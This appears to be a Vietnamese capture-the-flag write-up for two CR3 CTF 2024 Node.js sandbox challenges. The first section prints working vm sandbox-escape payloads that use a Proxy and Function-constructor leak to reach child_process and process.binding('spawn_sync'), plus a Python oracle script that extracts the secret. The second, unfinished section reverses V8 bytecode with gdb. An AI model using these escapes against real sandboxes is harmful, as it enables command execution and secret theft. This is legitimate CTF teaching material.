---
title: "CR3 CTF 2024"
description: "CR3 CTF 2024"
summary: "CR3 CTF 2024"
categories: ["Writeup"]
tags: ["Web", "Reverse"]
#externalUrl: ""
date: 2024-05-03
draft: true
authors:
  - Shin24
---

Tối hôm trước mình có làm vài bài bên CR3 CTF để warmup cho Hacktheon 2024 vào thứ 7, sau đây là writeup của mình cho 2 bài `jscripting` và `jscripting-revenge`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/3e7c5b74-9ef1-4a96-9e07-07dd01ac4fca)

# Jscripting
Có thể nói đây là một nodejs sandbox dùng worker thread để chạy external code, dùng một custom `require` function chỉ cho phép gọi đến một danh sách các module giới hạn, mục tiêu sẽ là exfiltrate được flag hay secret gì đó. Module `vm` của nodejs được chọn để chạy external code, tuy nhiên module này không được tạo ra với mục đích bảo mật, đây chỉ là module giúp lập trình viên run code trong một context khác để tránh xung đột và ảnh hưởng đến các object ở context chính. Để escape ra `vm` thì việc thường làm sẽ là tìm cách leak các object từ bên ngoài thông qua các callback hoặc proxy
```js
(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor('return 123'))();
         }
         return me[key];
  }
})
```
Khi kết quả được trả về nó sẽ được cast về chuỗi thông qua `String()` hoặc `JSON.stringify`, đối với `JSON.stringify` nó sẽ invoke hàm `toJSON` của object, nếu invoke nghĩa là trước đó nó sẽ cần get method này, do đó method `get` của proxy sẽ được trigger, từ đó ta có thể tuy cập đến `arguments.callee.caller` và leak được object `JSON.stringify`. Ở đây thì `require` đã bị thay thế như bên trên đề cập, `globalThis.process` cũng bị set về null nhưng `globalThis.module` thì vẫn còn, ta có thể invoke tới `globalThis.module.constructor.createRequire` để tạo lại function `require`.
```
1});(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor(' globalThis.module.constructor.createRequire("/etc/passwd")("child_process").execSync("ls")'))();
         }
         return me[key];
  }
})
```

Khi chạy payload trên ta nhận về một lỗi:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/97c034ab-ced2-4f3b-b09f-148bffbb333b)

Khi mình trace vào source code của nodejs thì như sau:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cc096d1d-0ed5-4aed-a8c3-507e4bccebe2)

Nhìn lại code của đề:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/152a2cf5-01da-4d94-895c-b000753864fc)

Không rõ là vô tình hay cố ý nhưng việc set `process.env` thành null khiến cho ta không thể invoke `exec` của `child_process` được nữa. Một fact đó là `globalThis.process` thật ra là một module và được nodejs auto expose ra, ta có thể chủ đông import lại module này bằng cách `require("process")`, ở đây ta có thể đơn giản là set `process.env = {}` để không gặp lỗi khi chạy `child_process` nữa, cách của mình thì lại lợi dụng `process.binding` để truy cập đến các low level API của nodejs, cụ thể là `spawn_sync` để RCE
```js
1});(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor(' globalThis.module.constructor.createRequire("/etc/passwd")("process").binding("spawn_sync").spawn({file: "/bin/sh",args: ["/bin/sh","-c", "calc.exe" ], stdio: [ {type:"pipe",readable:true,writable:false}, {type:"pipe",readable:false,writable:true}, {type:"pipe",readable:false,writable:true} ]})'))();
         }
         return me[key];
  }
})
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/22a895ca-6fa1-4f10-95f2-a8264ce4c7d0)

Thực chất ta có thể exfiltrate biến `flag`, nhưng flag thật thì nằm ở `secret`, code để oracle attack biến `flag`:
```
import requests
import string

data = "1});(() => { throw new Proxy({}, {\n  get: function(me, key) {\n\t const cc = arguments.callee.caller;\n\t if (cc != null) {\n\t\treturn (cc.constructor.constructor('if (Object.getOwnPropertyDescriptor(globalThis.storage, \"secret\").value[INDEX] == \"CHAR\") {return 200}else{return 404}'))();\n\t }\n\t return me[key];\n  }\n})"
charset = string.printable
flag = "cr3{"
for i in range(4 ,100):
    for c in charset:
        payload = data.replace("INDEX", str(i)).replace("CHAR", c)
        try:
            r = requests.post("https://jscripting.1337.sb/api/execute", json={
                "script": payload
            })
            print(c)
            if "OK" in r.text:
                flag += c
                print("===>" + flag)
                if c == "}":
                    exit()
                break
        except:
            pass
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e8c7725e-a07c-4d66-9360-3f1927392741)

# Jscripting-revenge [UPDATING...]

Vì có `revenge` trong tên nên hẳn là context bài này giống bài cũ, nhưng patch lại một cái gì đó. Ta thấy lần này có một file `utils.jsc` được ship cùng và một file `bytecode.js` dùng để run file file jsc kia

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6efbbcc6-0220-466d-99b4-ae3fbc6abefd)

Dùng tính năng prettier của chrome để beautify lại cái js cho tiện

```js
const vm = require('vm');
function generateScript(a, b) {
    fixBytecode(a);
    const c = readSourceHash(a);
    let d = "";
    1 < c && (d = "\"" + "\u200B".repeat(c - 2) + "\"");
    const e = new vm.Script(d,{
        cachedData: a,
        filename: b
    });
    if (e.cachedDataRejected)
        throw new Error("Invalid or incompatible cached data (cachedDataRejected)");
    return e
}
const readSourceHash = function(a) {
    if (!Buffer.isBuffer(a))
        throw new Error("bytecodeBuffer must be a buffer object.");
    return process.version.startsWith("v8.8") || process.version.startsWith("v8.9") ? a.subarray(12, 16).reduce((a,b,c)=>a += b * Math.pow(256, c), 0) : a.subarray(8, 12).reduce((a,b,c)=>a += b * Math.pow(256, c), 0)
}
  , compileCode = function(a, b) {
    if ("string" != typeof a)
        throw new Error(`javascriptCode must be string. ${typeof a} was given.`);
    const c = new vm.Script(a,{
        produceCachedData: !0
    });
    let d = c.createCachedData && c.createCachedData.call ? c.createCachedData() : c.cachedData;
    return b && (d = brotliCompressSync(d)),
    d
}
  , fixBytecode = function(a) {
    if (!Buffer.isBuffer(a))
        throw new Error("bytecodeBuffer must be a buffer object.");
    const b = compileCode("\"\u0CA0_\u0CA0\"")
      , c = parseFloat(process.version.slice(1, 5));
    process.version.startsWith("v8.8") || process.version.startsWith("v8.9") ? (b.subarray(16, 20).copy(a, 16),
    b.subarray(20, 24).copy(a, 20)) : 12 <= c && 21 >= c ? b.subarray(12, 16).copy(a, 12) : (b.subarray(12, 16).copy(a, 12),
    b.subarray(16, 20).copy(a, 16))
}
  , runBytecode = function(a) {
    if (!Buffer.isBuffer(a))
        throw new Error("bytecodeBuffer must be a buffer object.");
    const b = generateScript(a);
    return b.runInThisContext()
}
  , runBytecodeFile = function(a) {
    if ("string" != typeof a)
        throw new Error(`filename must be a string. ${typeof a} was given.`);
    const b = require('fs').readFileSync(a);
    return runBytecode(b)
};
module.exports = {
    runBytecodeFile
};
```

Vậy file này dùng `vm` để run compiled bytecode, vậy mình nghĩ ta cần biết được thực sự file kia chạy gì, mình qua một file test để run standalone cái `utils.jsc`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5fbf6d69-a112-4aaa-89af-6ac91762ceec)

Bị lỗi, nhìn lại vào source `worker.js` ta thấy `runBytecodeFile("./utils.jsc")` trả về một anonymous function, trước khi invoke function này thì có một dòng `globalThis.require = require;`, ta thử thêm dòng này vào vì khả năng function mà lỗi đang nhắc đến là `globalThis.require`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/91e8f86c-5f1c-48d7-aaf7-7e537c25c99d)

Lỗi khác được trả về, tới đây thì stuck một lúc, mình suy đoán là có thể nó đang thao tác gì đó với `globalThis.storage` nên mình thử thêm vào

```js
const { runBytecodeFile } = require("./bytecode.js")

globalThis.require = require;

secret = "SECRET"
flag = "FLAG"

globalThis.storage = new Proxy({ secret },
    {
        get: (target, name) => {
            if (name === "secret") {
                return null;
            }
    
            return target[name];
        },
    
        getOwnPropertyDescriptor: (target, name) => {
            if (name === "secret") {
                return {
                    value: flag,
                    writable: true,
                    enumerable: true,
                    configurable: true,
                };
            }
    
            return target[name];
        }
    });

runBytecodeFile("./utils.jsc")();
```

Lần này lỗi không throw ra nữa, nhưng vấn đề là làm sao để ta biết được cụ thể thì `utils.js` đang làm gì?

## Reversing V8 bytecode
Tới đây mình quyết định trace các function call của V8
```
node --trace test.js
```

Vì khi trace như vầy thì nó sẽ in ra tất cả function call của nodejs internal, ta có thể narrow down bằng cách tìm đến đoạn bắt đầu load `utils.js` vì sau đó chắc chắn là các function call của `utils.jsc`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5c571f1d-1e71-40d2-824a-a85e412684c2)

Chắc là cỡ đoạn này, tiếp tục trace xuống ta thấy nó import module `util`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7a53c379-1adc-4568-8bc0-c7ac5052628e)

Tìm thấy đoạn nó thao tác với symbol `nodejs.util.inspect.custom`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/716f16f6-da33-40a5-949b-7801e0c485f5)

Chưa có thông tin gì nhiều lắm, nhưng với 2 dữ kiện là import `util` và truy cập vào symbol `nodejs.util.inspect.custom` thì có thể `globalThis.storage` đang chứa gì đó, tới đây mình quyết định debug v8 của nodejs

```js
const { runBytecodeFile } = require("./bytecode.js")

globalThis.require = require;

secret = "SECRET"
flag = "FLAG"

globalThis.storage = new Proxy({ secret },
    {
        get: (target, name) => {
            if (name === "secret") {
                return null;
            }
    
            return target[name];
        },
    
        getOwnPropertyDescriptor: (target, name) => {
            if (name === "secret") {
                return {
                    value: flag,
                    writable: true,
                    enumerable: true,
                    configurable: true,
                };
            }
    
            return target[name];
        }
    });

runBytecodeFile("./utils.jsc")();

%DebugPrint(globalThis.storage);
%SystemBreak();
```

```
gdb node
pwndbg> r --allow-natives-syntax test.js
```

Ta dùng option --allow-natives-syntax thì v8 sẽ expose ra một số API phục vụ cho debug, `%DebugPrint` sẽ in các thông tin về memory của một object, `%SystemBreak` sẽ dùng để set breakpoint. Mình sẽ dùng gdb script của v8 để tiện cho debug: https://chromium.googlesource.com/v8/v8/+/refs/heads/main/tools/gdbinit

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/74764246-1660-4478-8d36-a508cae8505c)

```
target: 0x17067d4aec29
```

Đây là `global.storage`, ta sẽ inspect nó bằng lên `job` của v8 gdb script

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/edf3feb7-3005-47a7-8fa2-e85ec751f3e9)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/484d8707-772a-4409-803a-be922b7d9275)

Tìm thấy symbol đó rồi, giờ ta sẽ inspect byte codes của nó

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/805f8149-15be-4c13-be87-4e6ddc76a4ab)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/91b339e7-e26d-4040-8a70-c70c7c4ef4d6)

Đây là các constant của nó, v8 bytecode chỉ thao tác với các constant, register gồm thanh ghi accumulator và các thanh ghi r0, r1, ... 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/bf475f42-1f6b-48ae-87b8-96941d0d6e53)

Đoạn này sẽ load `depth` vào, truyền vào `parseInt` và kết quả trả về lưu vào trong r0  

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4b48eb63-9b3e-4e31-b958-45f198e4a589)

Sau đó sẽ tiếp tục so sánh xem có lớn hơn `3` không

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2bb2743a-9074-4f2c-a558-15e8fb0c6682)

Nếu đúng thì sẽ load constant 2 là `Error: Too deep` và return 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9c33b1ca-5fe8-4869-ba39-f54afa29ca99)

Để kiểm chứng thì ta có thể chạy thử

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f657111b-cf26-4ba5-927c-f00922cafc53)

Nếu sai thì jump đến `+28`, tại đây như ban đầu ta biết `a1` là depth, vậy là lúc nãy truyền vào `parseInt` để check thôi chứ depth không bị thay đổi, tiếp tục lưu `depth` vào `r0` bằng lệnh `Star0` và so sánh với `Infinity`, nếu không bằng thì sẽ nhảy đến `+46`, tại `+46` sẽ load constant `haha nice try!` và return

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/10c13d29-5cc5-45a7-b29d-35573ac69e19)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9175f2bb-6565-4827-bfc8-76f4bd62f596)

Vậy có vẻ nhánh ta cần vào là lúc `depth` == `Infinity`, cùng thử xem sao

```js
const { runBytecodeFile } = require("./bytecode.js")

globalThis.require = require;

secret = "SECRET"
flag = "FLAG"

globalThis.storage = new Proxy({ secret },
    {
        get: (target, name) => {
            if (name === "secret") {
                return null;
            }
    
            return target[name];
        },
    
        getOwnPropertyDescriptor: (target, name) => {
            if (name === "secret") {
                return {
                    value: flag,
                    writable: true,
                    enumerable: true,
                    configurable: true,
                };
            }
    
            return target[name];
        }
    });

runBytecodeFile("./utils.jsc")();


// %DebugPrint(globalThis.storage);
// %SystemBreak();

const util = require("util");

console.log(util.inspect(globalThis.storage, { compact: false, depth: Infinity, breakLength: 0 }))


```

```
{
  '👺': {
    '👺': {
      '👺': {
        '👺': {
          '👺': {
            '👺': {
              '👺': {
                '👺': {
                  '👺': {
                    '👺': {
                      '👺': {
                        '👺': {
                          '👺': {
                            '👺': {
...
```

Vl bị troll rồi à =))) Vậy thử gọi `util.inspect` lên `globalThis` xem sao

```
<ref *1> Object [global] {
  global: [Circular *1],
  clearImmediate: [Function: clearImmediate],
  setImmediate: [Function: setImmediate] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  },
  clearInterval: [Function: clearInterval],
  clearTimeout: [Function: clearTimeout],
  setInterval: [Function: setInterval],
  setTimeout: [Function: setTimeout] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  },
  queueMicrotask: [Function: queueMicrotask],
  structuredClone: [Getter/Setter],
  atob: [Getter/Setter],
  btoa: [Getter/Setter],
  performance: [Getter/Setter],
  fetch: [AsyncFunction: fetch],
  crypto: [Getter],
  secret: 'SECRET',
  flag: 'FLAG',
  storage: {
    '👺': {
      '👺': {
        '👺': {
          '👺': {
...
secureRequire: [Function: secureRequire]
```

Ta thấy được flag và một function `secureRequire`, thử dùng `%DebugPrint` để xem bytecode của `secureRequire` như cách vừa nãy thử

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/979938e4-8422-4fc0-b7fe-616e2041c10b)

Nhìn vào các constant mình có thể đoán được là ta chỉ có thể require `util`, như thế là đủ rồi
